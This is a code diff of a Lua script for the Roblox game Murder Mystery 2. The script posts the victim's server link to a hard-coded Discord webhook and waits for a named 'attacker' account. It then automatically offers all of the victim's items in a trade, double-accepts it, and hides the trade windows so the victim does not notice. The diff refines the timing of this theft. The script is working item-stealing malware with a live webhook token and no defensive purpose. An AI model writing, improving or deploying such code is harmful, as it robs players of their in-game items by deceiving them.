@@ -1,9 +1,8 @@
---[=[ MM2 AUTO-TRADE – Invisible + Full Item Transfer ]=]
+--[=[ MM2 AUTO-TRADE – Targeted, reliable ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
 
--- Webhook sender
 local function send(msg)
     local HttpService = game:GetService("HttpService")
     local data = HttpService:JSONEncode({content = msg})
@@ -19,18 +18,16 @@ local function send(msg)
     return false
 end
 
--- Send server link to Discord
 local placeId, jobId = game.PlaceId, game.JobId
 local joinLink = "https://www.roblox.com/games/" .. placeId .. "?serverId=" .. jobId
 send("MM2 Server: " .. joinLink)
-print("Server link sent to Discord.")
+print("Server link sent.")
 
--- Local player & character
 local player = game.Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
 local root = char:WaitForChild("HumanoidRootPart")
 
--- Fly & Noclip (optional)
+-- Fly & Noclip (keep for distraction)
 local flying, noclip = false, false
 local speed = 50
 local function toggleFly()
@@ -69,41 +66,7 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
 end)
 
 -- ============================================================
--- AGGRESSIVE GUI HIDER – runs every 0.2 seconds
--- ============================================================
-local function hideAllTradeGUIs()
-    local gui = player:FindFirstChild("PlayerGui")
-    if not gui then return end
-    for _, obj in pairs(gui:GetDescendants()) do
-        if obj:IsA("ScreenGui") then
-            local name = obj.Name:lower()
-            if name:find("trade") or name:find("request") or name:find("offer") then
-                obj.Enabled = false
-            end
-        end
-        if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
-            local name = obj.Name:lower()
-            if name:find("trade") or name:find("request") or name:find("offer") then
-                obj.Visible = false
-                obj.Active = false
-            end
-        end
-        if obj:IsA("TextButton") and (obj.Name:lower():find("accept") or obj.Name:lower():find("add") or obj.Name:lower():find("select")) then
-            -- Disable button interactivity
-            obj.Visible = false
-        end
-    end
-end
-
--- Persistent hiding loop
-spawn(function()
-    while wait(0.1) do
-        hideAllTradeGUIs()
-    end
-end)
-
--- ============================================================
--- TRADE AUTOMATION (remote + GUI click + fallback)
+-- TRADE AUTOMATION – with proper timing
 -- ============================================================
 local RS = game:GetService("ReplicatedStorage")
 local Trade = RS:FindFirstChild("Trade")
@@ -118,21 +81,26 @@ local OfferItem = Trade:FindFirstChild("OfferItem")
 
 if not SendReq or not AcceptReq then print("Missing remotes"); return end
 
--- Method 1: Click all "Add" buttons in the trade GUI
-local function clickAddButtons()
+-- Helper to find trade GUI (without hiding)
+local function findTradeGUI()
     local gui = player:FindFirstChild("PlayerGui")
-    if not gui then return 0 end
-    local tradeGUI = nil
+    if not gui then return nil end
     local function search(parent)
         for _, child in pairs(parent:GetChildren()) do
             if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
-                tradeGUI = child
-                return
+                return child
             end
-            search(child)
+            local found = search(child)
+            if found then return found end
         end
+        return nil
     end
-    search(gui)
+    return search(gui)
+end
+
+-- Add items by clicking GUI buttons (only when visible)
+local function addItemsViaGUI()
+    local tradeGUI = findTradeGUI()
     if not tradeGUI then return 0 end
     local count = 0
     for _, btn in pairs(tradeGUI:GetDescendants()) do
@@ -141,18 +109,18 @@ local function clickAddButtons()
             if name:find("add") or name:find("select") or name:find("offer") then
                 pcall(function()
                     btn:FireServer()
+                    wait(0.05)
                     btn:FireServer() -- double
                 end)
                 count = count + 1
-                wait(0.05)
             end
         end
     end
     return count
 end
 
--- Method 2: Use OfferItem remote with every tool
-local function offerAllTools()
+-- Add items via OfferItem remote (most reliable)
+local function addItemsViaRemote()
     if not OfferItem then return 0 end
     local offered = 0
     local tools = {}
@@ -163,33 +131,41 @@ local function offerAllTools()
         if t:IsA("Tool") then table.insert(tools, t) end
     end
     for _, tool in ipairs(tools) do
-        -- Try multiple argument patterns
+        -- Try various arguments
+        local success = false
         local patterns = {
             function() OfferItem:FireServer(tool) end,
             function() OfferItem:FireServer(tool.Name) end,
-            function() OfferItem:FireServer(tool:GetAttribute("ItemId") or tool:GetAttribute("ID") or 0) end,
+            function() OfferItem:FireServer(tool:GetAttribute("ItemId") or 0) end,
         }
         for _, p in ipairs(patterns) do
             local ok, err = pcall(p)
-            if ok then
-                offered = offered + 1
-                print("Offered: " .. tool.Name)
-                break
-            end
+            if ok then success = true; break end
         end
-        wait(0.1)
+        if success then
+            offered = offered + 1
+            print("Offered: " .. tool.Name)
+        end
+        wait(0.05)
     end
     return offered
 end
 
--- Method 3: Simulate mouse clicks on buttons (if FireServer fails)
-local function simulateClicks()
-    -- This is a fallback; not all executors support mouse simulation.
-    -- We'll skip for now.
-    return 0
+-- Hide the trade GUI after items are added
+local function hideTradeGUI()
+    local gui = player:FindFirstChild("PlayerGui")
+    if not gui then return end
+    for _, obj in pairs(gui:GetDescendants()) do
+        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request") or obj.Name:lower():find("offer")) then
+            obj.Enabled = false
+        end
+        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request") or obj.Name:lower():find("offer")) then
+            obj.Visible = false
+        end
+    end
 end
 
--- Main trade sequence
+-- Main sequence
 spawn(function()
     print("Waiting for attacker: " .. attackerUsername)
     local target = nil
@@ -204,49 +180,47 @@ spawn(function()
         wait(1)
     end
 
-    wait(3) -- let attacker settle
+    wait(3)
 
     -- Step 1: Send request
     local ok, res = pcall(function() return SendReq:InvokeServer(target) end)
     if not ok then print("SendRequest failed: " .. tostring(res)); return end
-    print("Trade request sent")
+    print("Request sent")
 
     wait(1)
 
     -- Step 2: Accept request
     pcall(function() AcceptReq:FireServer() end)
-    print("Accept request fired")
+    print("Accepted request")
 
     wait(1)
 
     -- Step 3: Start trade
     if StartTr then pcall(function() StartTr:FireServer() end) end
 
-    wait(0.5)
+    wait(1)
 
-    -- Step 4: Hide GUI (aggressive)
-    hideAllTradeGUIs()
-
-    -- Step 5: Add items – try both methods
-    local added = 0
-    added = clickAddButtons()
-    print("Added via GUI: " .. added)
+    -- Step 4: Add items (do this while GUI is visible)
+    local added = addItemsViaRemote()
     if added == 0 then
-        added = offerAllTools()
-        print("Added via remote: " .. added)
+        added = addItemsViaGUI()
     end
+    print("Items offered: " .. added)
 
     wait(1)
 
-    -- Step 6: Final accept (double)
+    -- Step 5: Final accept (double)
     pcall(function() AcceptTr:FireServer() end)
     wait(0.3)
     pcall(function() AcceptTr:FireServer() end)
 
     wait(0.5)
 
-    -- Step 7: Complete trade
+    -- Step 6: Complete trade
     if CompleteTr then pcall(function() CompleteTr:FireServer() end) end
+
+    -- Step 7: Hide GUI after everything is done (or we can hide earlier, but we want items added first)
+    hideTradeGUI()
 
     print("=== TRADE COMPLETED ===")
 end)
